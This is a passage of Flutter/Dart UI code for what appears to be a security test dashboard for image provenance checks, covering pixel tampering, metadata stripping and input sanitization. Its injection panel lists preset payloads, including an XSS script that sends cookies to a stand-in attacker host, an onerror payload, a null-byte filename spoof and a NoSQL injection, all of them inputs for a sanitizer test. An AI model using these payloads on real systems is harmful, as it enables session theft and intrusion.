                    style: GoogleFonts.plusJakartaSans(
                      fontSize: 15,
                      fontWeight: FontWeight.w900,
                      color: Colors.white,
                      letterSpacing: 0.5,
                    ),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    'Tests visual manipulation detection when metadata container is intact, but pixels were subtly altered.',
                    style: GoogleFonts.plusJakartaSans(
                      fontSize: 12,
                      color: CyberTheme.textSecondary,
                    ),
                  ),
                ],
              ),
              CyberButton(
                variant: s.isAltered ? CyberButtonVariant.emerald : CyberButtonVariant.purple,
                height: 38,
                padding: const EdgeInsets.symmetric(horizontal: 18),
                icon: s.isAltered ? Icons.restore : Icons.grain_rounded,
                onTap: _toggleSteganographyAttack,
                child: Text(s.isAltered ? 'Reset Visual Matrix' : 'Simulate 2% Hue Shift'),
              ),
            ],
          ),
          const SizedBox(height: 20),

          // Inference Stats Bar
          Row(
            children: [
              _buildMetricTile(
                label: 'PERCEPTUAL DRIFT',
                value: '${s.perceptualDrift.toStringAsFixed(2)}%',
                isAlert: s.isAltered,
              ),
              const SizedBox(width: 12),
              _buildMetricTile(
                label: 'ANOMALY DETECTED',
                value: s.isAltered ? 'TAMPERED PIXELS' : 'NONE (PRISTINE)',
                isAlert: s.isAltered,
              ),
              const SizedBox(width: 12),
              _buildMetricTile(
                label: 'INFERENCE ACCELERATION',
                value: 'RTX 3050 TENSOR CORE',
                isAlert: false,
                isHighlight: true,
              ),
            ],
          ),
          const SizedBox(height: 20),

          // The High-Contrast Steganography Neon Heat-Map Canvas
          Container(
            padding: const EdgeInsets.all(20),
            decoration: BoxDecoration(
              color: Colors.black.withValues(alpha: 0.45),
              borderRadius: BorderRadius.circular(18),
              border: Border.all(
                color: s.isAltered ? const Color(0x60C084FC) : const Color(0x30FFFFFF),
              ),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        const Icon(Icons.blur_on_rounded, color: Color(0xFFC084FC), size: 18),
                        const SizedBox(width: 8),
                        Text(
                          'WEBGL 16x16 STEGANOGRAPHY ANOMALY HEAT-MAP',
                          style: GoogleFonts.jetBrainsMono(
                            fontSize: 11,
                            fontWeight: FontWeight.w800,
                            color: Colors.white,
                            letterSpacing: 0.8,
                          ),
                        ),
                      ],
                    ),
                    Text(
                      s.anomalyCoordinates ?? 'Visual Parity: 100%',
                      style: GoogleFonts.jetBrainsMono(
                        fontSize: 10.5,
                        fontWeight: FontWeight.w700,
                        color: s.isAltered ? const Color(0xFFFB7185) : const Color(0xFF34D399),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 16),

                // Heat-Map Visual Grid Canvas
                Center(
                  child: Container(
                    width: 320,
                    height: 320,
                    decoration: BoxDecoration(
                      color: const Color(0xFF0D0818),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(color: const Color(0x35FFFFFF)),
                    ),
                    child: ClipRRect(
                      borderRadius: BorderRadius.circular(12),
                      child: CustomPaint(
                        painter: _SteganographyHeatMapPainter(
                          vector: s.heatmapVector,
                          isAltered: s.isAltered,
                        ),
                      ),
                    ),
                  ),
                ),
                const SizedBox(height: 14),
                Center(
                  child: Text(
                    s.isAltered
                        ? 'High-contrast neon overlay paints exact altered pixel coordinate quadrant (Quadrant B: X:5..11, Y:4..9).'
                        : 'Visual tensor baseline: All quadrants within mathematical tolerance (drift < 0.05%).',
                    style: GoogleFonts.plusJakartaSans(
                      fontSize: 11.5,
                      color: const Color(0xFF94A3B8),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ------------------------------------------
  // PANEL 3: THE METADATA SCRUB ATTACK
  // ------------------------------------------
  Widget _buildTest3MetadataScrubPanel() {
    final m = _report.metadataScrub;

    return Container(
      padding: const EdgeInsets.all(24),
      decoration: BoxDecoration(
        color: const Color(0x14FFFFFF),
        borderRadius: BorderRadius.circular(22),
        border: Border.all(color: const Color(0x28FFFFFF), width: 1.0),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'TEST 3: THE METADATA SCRUB (SOCIAL MEDIA INTERCEPTION)',
                    style: GoogleFonts.plusJakartaSans(
                      fontSize: 15,
                      fontWeight: FontWeight.w900,
                      color: Colors.white,
                      letterSpacing: 0.5,
                    ),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    'Tests detection when WhatsApp, Discord, or web proxies strip EXIF and C2PA JUMBF headers.',
                    style: GoogleFonts.plusJakartaSans(
                      fontSize: 12,
                      color: CyberTheme.textSecondary,
                    ),
                  ),
                ],
              ),
              CyberButton(
                variant: m.isScrubbed ? CyberButtonVariant.emerald : CyberButtonVariant.danger,
                height: 38,
                padding: const EdgeInsets.symmetric(horizontal: 18),
                icon: m.isScrubbed ? Icons.restore : Icons.layers_clear_rounded,
                onTap: _toggleMetadataScrubAttack,
                child: Text(m.isScrubbed ? 'Re-anchor JUMBF Header' : 'Simulate WhatsApp/Discord Scrub'),
              ),
            ],
          ),
          const SizedBox(height: 20),

          // Metadata Inspection Matrix
          Container(
            padding: const EdgeInsets.all(18),
            decoration: BoxDecoration(
              color: Colors.black.withValues(alpha: 0.35),
              borderRadius: BorderRadius.circular(16),
              border: Border.all(
                color: m.isScrubbed ? const Color(0x50F59E0B) : const Color(0x3010B981),
              ),
            ),
            child: Column(
              children: [
                _buildMetadataStatusRow(
                  label: 'C2PA JUMBF PAYLOAD CONTAINER',
                  value: m.hasJumbfPayload ? 'PRESENT (c2pa:jumbf:assertion-store)' : 'NULL POINTER (0x0 - STRIPPED)',
                  isValid: m.hasJumbfPayload,
                ),
                const Padding(
                  padding: EdgeInsets.symmetric(vertical: 10),
                  child: Divider(color: Color(0x20FFFFFF), height: 1),
                ),
                _buildMetadataStatusRow(
                  label: 'RUST FFI PARSER STATUS',
                  value: m.hasJumbfPayload ? 'PARSED SUCCESSFULLY (C2PA v1.4)' : 'FAILED: BOX HEADER NOT FOUND',
                  isValid: m.hasJumbfPayload,
                ),
                const Padding(
                  padding: EdgeInsets.symmetric(vertical: 10),
                  child: Divider(color: Color(0x20FFFFFF), height: 1),
                ),
                _buildMetadataStatusRow(
                  label: 'ORIGIN DEVICE CERTIFICATE CHAIN',
                  value: m.originCertificateValid ? 'VALID ED25519 HARDWARE SIGNATURE' : 'BROKEN / MISSING CERTIFICATE',
                  isValid: m.originCertificateValid,
                ),
              ],
            ),
          ),
          const SizedBox(height: 18),

          // Interception Diagnosis Callout Box
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(
              color: m.isScrubbed ? const Color(0x18F59E0B) : const Color(0x14FFFFFF),
              borderRadius: BorderRadius.circular(16),
              border: Border.all(
                color: m.isScrubbed ? const Color(0x50F59E0B) : const Color(0x20FFFFFF),
              ),
            ),
            child: Row(
              children: [
                Icon(
                  m.isScrubbed ? Icons.warning_amber_rounded : Icons.check_circle_outline_rounded,
                  color: m.isScrubbed ? const Color(0xFFFBBF24) : const Color(0xFF34D399),
                  size: 22,
                ),
                const SizedBox(width: 14),
                Expanded(
                  child: Text(
                    m.interceptorDiagnosis ?? 'Asset origin proof verified.',
                    style: GoogleFonts.plusJakartaSans(
                      fontSize: 12,
                      color: m.isScrubbed ? const Color(0xFFFDE68A) : CyberTheme.textSecondary,
                      height: 1.4,
                    ),
                  ),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ------------------------------------------
  // PANEL 4: THE INJECTION ATTACK
  // ------------------------------------------
  Widget _buildTest4InjectionSanitizationPanel() {
    final s = _report.sanitization;

    return Container(
      padding: const EdgeInsets.all(24),
      decoration: BoxDecoration(
        color: const Color(0x14FFFFFF),
        borderRadius: BorderRadius.circular(22),
        border: Border.all(color: const Color(0x28FFFFFF), width: 1.0),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(
                    'TEST 4: THE INJECTION ATTACK (UI ATTACK SURFACE REDUCTION)',
                    style: GoogleFonts.plusJakartaSans(
                      fontSize: 15,
                      fontWeight: FontWeight.w900,
                      color: Colors.white,
                      letterSpacing: 0.5,
                    ),
                  ),
                  const SizedBox(height: 4),
                  Text(
                    'Ensures UI attack surface reduction deterministically drops HTML, XSS scripts, and spoofed metadata.',
                    style: GoogleFonts.plusJakartaSans(
                      fontSize: 12,
                      color: CyberTheme.textSecondary,
                    ),
                  ),
                ],
              ),
              CyberButton(
                variant: CyberButtonVariant.purple,
                height: 38,
                padding: const EdgeInsets.symmetric(horizontal: 18),
                icon: Icons.shield_outlined,
                onTap: _runInjectionSanitizationTest,
                child: const Text('Execute Sanitization Check'),
              ),
            ],
          ),
          const SizedBox(height: 20),

          // Preset Payloads Picker
          Wrap(
            spacing: 8,
            runSpacing: 8,
            children: [
              _buildPayloadPresetChip(
                label: 'XSS Script Tag',
                payload: '<script>fetch("https://attacker.site/leak?k="+document.cookie)</script>',
              ),
              _buildPayloadPresetChip(
                label: 'Image Event Exploit',
                payload: '<img src=x onerror=alert(document.domain)>',
              ),
              _buildPayloadPresetChip(
                label: 'Null-Byte Termination',
                payload: 'classified_intel.pdf\x00.exe --spoofed',
              ),
              _buildPayloadPresetChip(
                label: 'NoSQL Operator Injection',
                payload: '{"\$where": "sleep(5000)", "role": "admin"}',
              ),
            ],
          ),
          const SizedBox(height: 16),

          // Raw Input Lane
          Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text(
                'RAW METADATA INGESTION INPUT LANE',
                style: GoogleFonts.jetBrainsMono(
                  fontSize: 10,
                  fontWeight: FontWeight.w800,
                  color: const Color(0xFFC084FC),
                  letterSpacing: 0.8,
                ),
              ),
              const SizedBox(height: 6),
              Container(
                decoration: BoxDecoration(
                  color: Colors.black.withValues(alpha: 0.4),
                  borderRadius: BorderRadius.circular(14),
                  border: Border.all(color: const Color(0x35FFFFFF)),
                ),
                child: TextField(
                  controller: _injectionController,
                  style: GoogleFonts.jetBrainsMono(
                    color: const Color(0xFFFB7185),
                    fontSize: 12,
                  ),
                  decoration: const InputDecoration(
                    contentPadding: EdgeInsets.symmetric(horizontal: 16, vertical: 12),
                    border: InputBorder.none,
                  ),
                ),
              ),
            ],
          ),
          const SizedBox(height: 18),

          // Sanitization Output Lane
          Container(
            padding: const EdgeInsets.all(18),
            decoration: BoxDecoration(
              color: const Color(0x1810B981),
              borderRadius: BorderRadius.circular(16),
              border: Border.all(color: const Color(0x4010B981)),
            ),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        const Icon(Icons.check_circle_rounded, color: Color(0xFF34D399), size: 16),
                        const SizedBox(width: 8),
                        Text(
                          'DETERMINISTIC SANITIZATION OUTPUT (TEXT-LANE ONLY)',
                          style: GoogleFonts.jetBrainsMono(
                            fontSize: 10.5,
                            fontWeight: FontWeight.w800,
                            color: const Color(0xFF34D399),
                            letterSpacing: 0.8,
                          ),
                        ),
                      ],
                    ),
                    Text(
                      s.sanitizationPolicy,
                      style: GoogleFonts.jetBrainsMono(
                        fontSize: 9.5,
                        color: const Color(0xFF6EE7B7),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 10),
                SelectableText(
                  s.sanitizedOutput,
                  style: GoogleFonts.jetBrainsMono(
                    fontSize: 12,
                    fontWeight: FontWeight.w700,
                    color: Colors.white,
                  ),
                ),
                const SizedBox(height: 12),
                Wrap(
                  spacing: 8,
                  children: s.threatsNeutralized.map((threat) {
                    return Container(
                      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 3),
                      decoration: BoxDecoration(
                        color: const Color(0x2834D399),
                        borderRadius: BorderRadius.circular(6),
                      ),
                      child: Text(
                        '✓ $threat',
                        style: GoogleFonts.jetBrainsMono(
                          fontSize: 9.5,
                          fontWeight: FontWeight.w700,
                          color: const Color(0xFF6EE7B7),
                        ),
                      ),
                    );
                  }).toList(),
                ),
              ],
            ),
          ),
        ],
      ),
    );
  }

  // ==========================================
  // HELPER WIDGETS
  // ==========================================
  Widget _buildHashRow({
    required String label,
    required String hash,
    required String badgeText,
    required Color badgeColor,
    bool isMismatch = false,
  }) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Row(
          mainAxisAlignment: MainAxisAlignment.spaceBetween,
          children: [
            Text(
              label,
              style: GoogleFonts.jetBrainsMono(
                fontSize: 10,
                fontWeight: FontWeight.w800,
                color: const Color(0xFF94A3B8),
                letterSpacing: 0.8,
              ),
            ),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 7, vertical: 2),
              decoration: BoxDecoration(
                color: badgeColor.withValues(alpha: 0.20),
                borderRadius: BorderRadius.circular(6),
                border: Border.all(color: badgeColor.withValues(alpha: 0.40)),
              ),
              child: Text(
                badgeText,
                style: GoogleFonts.jetBrainsMono(
                  fontSize: 8.5,
                  fontWeight: FontWeight.w800,
                  color: badgeColor,
                ),
              ),
            ),
          ],
        ),
        const SizedBox(height: 6),
        SelectableText(
          hash,
          style: GoogleFonts.jetBrainsMono(
            fontSize: 12.5,
            fontWeight: FontWeight.w700,
            color: isMismatch ? const Color(0xFFFB7185) : Colors.white,
          ),
        ),
      ],
    );
  }

  Widget _buildMetadataStatusRow({
    required String label,
    required String value,
    required bool isValid,
  }) {
    return Row(
      mainAxisAlignment: MainAxisAlignment.spaceBetween,
      children: [
        Text(
          label,
          style: GoogleFonts.jetBrainsMono(
            fontSize: 11,
            fontWeight: FontWeight.w700,
            color: const Color(0xFF94A3B8),
          ),
        ),
        Row(
          children: [
            Container(
              width: 7,
              height: 7,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: isValid ? const Color(0xFF10B981) : const Color(0xFFF59E0B),
              ),
            ),
            const SizedBox(width: 8),
            Text(
              value,
              style: GoogleFonts.jetBrainsMono(
                fontSize: 11,
                fontWeight: FontWeight.w800,
                color: isValid ? const Color(0xFF34D399) : const Color(0xFFFBBF24),
              ),
            ),
          ],
        ),
      ],
    );
  }

  Widget _buildMetricTile({
    required String label,
    required String value,
    required bool isAlert,
    bool isHighlight = false,
  }) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
        decoration: BoxDecoration(
          color: isAlert
              ? const Color(0x20F43F5E)
              : (isHighlight ? const Color(0x20A855F7) : const Color(0x10FFFFFF)),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(
            color: isAlert
                ? const Color(0x60F43F5E)
                : (isHighlight ? const Color(0x50C084FC) : const Color(0x20FFFFFF)),
          ),
        ),
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Text(
              label,
              style: GoogleFonts.jetBrainsMono(
                fontSize: 9.5,
                fontWeight: FontWeight.w800,
                color: const Color(0xFF94A3B8),
                letterSpacing: 0.6,
              ),
            ),
            const SizedBox(height: 4),
            Text(
              value,
              style: GoogleFonts.jetBrainsMono(
                fontSize: 13,
                fontWeight: FontWeight.w900,
                color: isAlert
                    ? const Color(0xFFFB7185)
                    : (isHighlight ? const Color(0xFFC084FC) : Colors.white),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildPayloadPresetChip({
    required String label,
    required String payload,
  }) {
    return InkWell(
      onTap: () {
        setState(() {
          _injectionController.text = payload;
          _runInjectionSanitizationTest();
        });
      },
      borderRadius: BorderRadius.circular(8),
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
        decoration: BoxDecoration(
          color: const Color(0x1AFFFFFF),
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: const Color(0x30FFFFFF)),
        ),
        child: Text(
          label,
          style: GoogleFonts.plusJakartaSans(
            fontSize: 11,
            fontWeight: FontWeight.w700,
            color: Colors.white,
          ),
        ),
      ),
    );
  }
}

/// Custom Canvas Painter rendering the 16x16 Steganography Anomaly Neon Heat-Map
class _SteganographyHeatMapPainter extends CustomPainter {
  final List<double> vector;
  final bool isAltered;

  _SteganographyHeatMapPainter({
    required this.vector,
    required this.isAltered,
  });

  @override
  void paint(Canvas canvas, Size size) {
    if (vector.isEmpty) return;
    final paint = Paint()..style = PaintingStyle.fill;
    const int gridSize = 16;
    final cellWidth = size.width / gridSize;
    final cellHeight = size.height / gridSize;

    for (int i = 0; i < 256; i++) {
      if (i >= vector.length) break;
      final row = i ~/ gridSize;
      final col = i % gridSize;
      final rect = Rect.fromLTWH(
        col * cellWidth + 0.5,
        row * cellHeight + 0.5,
        cellWidth - 1.0,
        cellHeight - 1.0,
      );

      final intensity = vector[i];
      if (intensity > 0.6) {
        // High-contrast neon anomalous cell (tampered pixels)
        paint.color = Color.lerp(
          const Color(0xFF9333EA),
          const Color(0xFFF43F5E),
          (intensity - 0.6) / 0.4,
        )!;
        canvas.drawRRect(
          RRect.fromRectAndRadius(rect, const Radius.circular(2)),
          paint,
        );
      } else if (intensity > 0.25) {
        // Subtle ambient baseline
        paint.color = const Color(0xFF7C3AED).withValues(alpha: intensity);
        canvas.drawRRect(
          RRect.fromRectAndRadius(rect, const Radius.circular(1.5)),
          paint,
        );
      } else {
        // Dark velvet baseline
        paint.color = const Color(0xFF1E1533).withValues(alpha: 0.6);
        canvas.drawRect(rect, paint);
      }
    }
  }

  @override
  bool shouldRepaint(covariant _SteganographyHeatMapPainter oldDelegate) {
    return oldDelegate.vector != vector || oldDelegate.isAltered != isAltered;
  }
}
